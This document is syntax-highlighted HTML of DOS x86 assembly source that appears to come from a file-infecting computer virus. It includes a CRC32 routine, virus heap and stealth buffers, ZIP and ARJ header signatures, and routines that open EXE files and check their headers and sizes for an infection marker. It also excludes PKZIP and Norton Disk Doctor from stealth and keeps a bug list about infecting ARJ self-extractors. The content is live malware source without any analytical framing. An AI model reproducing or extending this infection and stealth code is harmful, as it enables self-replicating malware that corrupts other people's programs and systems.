</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">star14t.inc</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">Calculate_CRC</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">Calculate_CRC5</span><span class="sc0">
</span><span class="sc1">;-+----------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;ds:si=ptr</span><span class="sc0">
</span><span class="sc1">;di=size</span><span class="sc0">
</span><span class="sc1">;return:    cx:dx=crc32</span><span class="sc0">
</span><span class="sc1">;-+----------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">Calculate_CRC5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">Calculate_CRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320H</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB8H</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+----------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">


</span><span class="sc1">;.DATA</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">vir_heap</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">dataencriptor</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">InfectTurn</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">zip_h</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">arj_h</span><span class="sc0">


</span><span class="sc1">;public five_bytes</span><span class="sc0">

</span><span class="sc5">zip_h</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ZIP_SIGN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ZIP_LCL_ID</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">arj_h</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ARJ_SIGN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31Eh</span><span class="sc0">
</span><span class="sc5">start_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vir_heap</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc5">WORKBUFFER</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">dataencriptor</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">CRYPTLEVEL</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">for_ret</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">StealthName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">InfectTurn</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">continue21</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">11d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ret_hook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ret_sux</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">ret_hook</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">ret_sux</span><span class="sc0">
</span><span class="sc1">;    public  after_goto</span><span class="sc0">
</span><span class="sc1">;after_goto    dw ?</span><span class="sc0">


</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1800h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">end_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;nameforinfect   db 80h dup (?)</span><span class="sc0">
</span><span class="sc1">;CurDta</span><span class="sc0">
</span><span class="sc5">mem_virus_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;data_size=end_data-begin_data</span><span class="sc0">
</span><span class="sc1">;all_memory_size_p equ (offset mem_virus_end+30h)/10h</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
</span><span class="sc5">get_sft</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;bx-handle ;es:di-ptr to sft</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1220h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1216h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_sft</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">get_cur_time</span><span class="sc0">
</span><span class="sc5">get_cur_time</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46Dh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_cur_time</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc5">STACKBASE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">restore_seek</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">save_seek</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">dosseek_bof</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DOSCALL</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DosCall_exc</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">NOSTL21NAMES</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">get_own_name</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">get_crc_just_fname</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;extrn check_PROCESS_NAME :near</span><span class="sc0">
</span><span class="sc1">;extrn EXE_TEST_READ    :near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">dosclose</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">read_buf_22</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;public exe_test_read</span><span class="sc0">
</span><span class="sc1">;public IfInfectName</span><span class="sc0">
</span><span class="sc1">;public IfInfectHandle</span><span class="sc0">
</span><span class="sc1">;public IfInfectBuf</span><span class="sc0">
</span><span class="sc1">;public IfInfectNameCustom</span><span class="sc0">
</span><span class="sc1">;public exe_test</span><span class="sc0">
</span><span class="sc1">;public test_size</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">IfInfectName</span><span class="sc0">    </span><span class="sc1">;ds:dx - filename ax - 3Dxx for open file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D40h</span><span class="sc0">     </span><span class="sc1">; open R/O file</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">IfInfectNameCustom</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ErrorRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall_exc</span><span class="sc0">       </span><span class="sc1">; open file</span><span class="sc0">
         </span><span class="sc1">;  ¥á«¨ ­¥ ®âªà®¥âáï - ®ç¥­ì ¯«®å® :(</span><span class="sc0">
         </span><span class="sc1">;­ ¤® ®¡ï§ â¥«ì­® ®âªàëâì (67h?)</span><span class="sc0">
</span><span class="sc1">;            push bx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">seek_end</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">test_size</span><span class="sc0">

</span><span class="sc1">;         jnz    ErrorRead</span><span class="sc0">


    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IfInfectHandle1</span><span class="sc0">
</span><span class="sc5">ErrorRead</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">dosclose</span><span class="sc0">  </span><span class="sc1">; close file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">


</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">IfInfectHandle</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ErrorRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">;don't close this file</span><span class="sc0">
</span><span class="sc5">IfInfectHandle1</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc5">MOVSEG</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc1">;*****************test size</span><span class="sc0">


         </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4400h</span><span class="sc0">        </span><span class="sc1">; IOCTL test for file/stream</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">DosCall</span><span class="sc0">     </span><span class="sc1">;NDD: open 'CON' :)</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">        </span><span class="sc5">ErrorRead</span><span class="sc0">        </span><span class="sc1">;no file</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">       </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">        </span><span class="sc5">ErrorRead</span><span class="sc0">        </span><span class="sc1">;no file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">save_seek</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         call   seek_end</span><span class="sc0">
</span><span class="sc1">;         call   test_size</span><span class="sc0">
</span><span class="sc1">;         jnz    ErrorRead</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">dosseek_bof</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">read_buf_22</span><span class="sc0">
</span><span class="sc1">;         jc     ErrorRead</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">restore_seek</span><span class="sc0">


</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">IfInfectBuf</span><span class="sc0">
</span><span class="sc1">;if PKZIP, NDD (ZF=1) - no stealth</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_own_name</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_crc_just_fname</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">ErrorRead</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">exe_test</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">ErrorRead</span><span class="sc0">         </span><span class="sc1">;test for infect</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_CS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;later to ss:[ExeCS]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_par_dir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SP</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STACKBASE</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;offset virus_start-10h ;ax - original size</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MININFECTSIZE</span><span class="sc4">/</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">         </span><span class="sc5">ErrorRead</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">        </span><span class="sc5">ErrorRead</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;IfInfectHandle endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">exe_test</span><span class="sc0">  </span><span class="sc1">;-+------- test for already infect -&gt; ZF=1 if infect</span><span class="sc0">
                                                   </span><span class="sc1">;ZF=0 - no infected file</span><span class="sc0">
</span><span class="sc1">;     mov       ax, [exehdr.exe_SS]</span><span class="sc0">
</span><span class="sc1">;     inc       ax</span><span class="sc0">
</span><span class="sc1">;     sub       ax, [exehdr.exe_CS]</span><span class="sc0">
</span><span class="sc1">;     DOIF Z</span><span class="sc0">

     </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SS.h</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_CS.h</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
     </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">BE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF0h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STACKBASE</span><span class="sc0">
     </span><span class="sc5">DONE</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">test_size</span><span class="sc0">  </span><span class="sc1">;ax-(file_size and 0FFFFh)</span><span class="sc0">
              </span><span class="sc1">;-+------- test for already infect -&gt; ZF=1 if possible infect</span><span class="sc0">
                                                   </span><span class="sc1">;ZF=0 - no infected file</span><span class="sc0">
</span><span class="sc1">;for length with virus</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEMARKER</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIZEMARKER_MOD</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc1">; BUG LIST</span><span class="sc0">
</span><span class="sc1">; 1. no infect ARJSFX</span><span class="sc0">
